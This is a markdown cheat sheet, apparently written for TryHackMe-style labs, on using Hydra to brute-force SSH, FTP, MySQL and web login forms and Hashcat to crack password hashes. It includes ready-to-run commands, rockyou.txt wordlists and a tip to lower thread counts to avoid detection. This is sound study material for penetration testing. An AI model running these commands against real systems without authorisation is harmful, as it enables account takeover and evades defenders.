# HYDRA / HASHCAT NOTES

## HYDRA

Hydra is a fast online password brute-force tool used against many network services such as:
- SSH
- FTP
- HTTP Login Forms
- MySQL
- SMTP
- Telnet
- RDP
- SMB
- and more

------------------------------------------------------------

## Hydra Syntax

## New Style

hydra [options] protocol://target:port

# Example
hydra ftp://192.168.0.2:2221 -l admin -P list.txt

## Old Style

hydra [options] <target> <protocol>

# Example
hydra 192.168.0.2 ftp -l admin -P list.txt -s 2221


------------------------------------------------------------

## Required Things for Hydra

### 1. Target

# Single Target
192.168.0.102

# Subnet
192.168.2.0/24


### 2. Headers (HTTP Modules)

A = auth-type  
H = custom header  
S = check for text in HTTP response


### 3. Important Options

-l = single username  
-L = username list  
-p = single password  
-P = password list  
-V = verbose output  
-vV = very verbose  
-t = tasks / threads  
-o = save output file  
-f = stop after first valid login found  
-s = custom port  
-m = module options


------------------------------------------------------------

## Password Testing with -e

-e nsr

n = try null/empty password  
s = try username as password  
r = try reversed username as password

# Example
root -> toor


------------------------------------------------------------

## Module Syntax Example (IMAP)

hydra -l test -p test -m PLAIN 127.0.0.1 imap

hydra -l test -p test 127.0.0.1 imap PLAIN

hydra -l test -p test imap://127.0.0.1/PLAIN


------------------------------------------------------------

## SSH Brute Force

hydra ssh://192.168.0.104:2222 -L users.txt -P passwords.txt -V

# Stop after success
hydra ssh://192.168.0.104:2222 -L users.txt -P passwords.txt -V -f

# Use only 2 threads
hydra ssh://192.168.0.104:2222 -L users.txt -P passwords.txt -V -t 2

# Login after credentials found
ssh username@192.168.0.104 -p 2222


------------------------------------------------------------

## FTP Brute Force

hydra ftp://192.168.145.137 -l anonymous -e n

hydra -l <username> -P <password-list> ftp://<IP>


------------------------------------------------------------

## MySQL Brute Force

hydra mysql://192.168.145.137 -l root -P /usr/share/wordlists/rockyou.txt -o result.txt -V


------------------------------------------------------------

## HTTP POST Login Brute Force

## Steps

1. Check login method (GET or POST)
2. Find login page path (example: /login.php)
3. Inspect input field names
4. Enter wrong password once
5. Copy failure message

## Example

hydra 192.168.145.137 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -L users.txt -P passwords.txt -V -f

## If redirect on success

:S=302

## Example

hydra 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:S=302" -l admin -P rockyou.txt


------------------------------------------------------------

## TryHackMe Examples

hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.234.180 -t 4 ssh

hydra -l <username> -P <wordlist> 10.10.119.89 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


------------------------------------------------------------

## Threading Note

Default Hydra can create many parallel requests.

Use lower threads to reduce detection:

-t 2
-t 4


------------------------------------------------------------

## HASHCAT

Hashcat is used to crack password hashes offline.

------------------------------------------------------------

## Basic Syntax

hashcat -m <hash-type> -a <attack-mode> hash.txt wordlist.txt

## Important Attack Modes

0 = Dictionary Attack  
3 = Brute Force  
6 = Wordlist + Mask  
7 = Mask + Wordlist


------------------------------------------------------------

## Examples

# MD5
hashcat -m 0 -a 0 hash.txt rockyou.txt

# SHA-512
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt


------------------------------------------------------------

## Common Hash Modes

0 = MD5  
100 = SHA1  
1400 = SHA256  
1700 = SHA512  
1800 = sha512crypt


------------------------------------------------------------

## Notes

- Hydra = online attack against live services
- Hashcat = offline attack against hashes
- Use small thread counts on real labs
- Always confirm field names before HTTP brute force
- rockyou.txt is common test wordlist
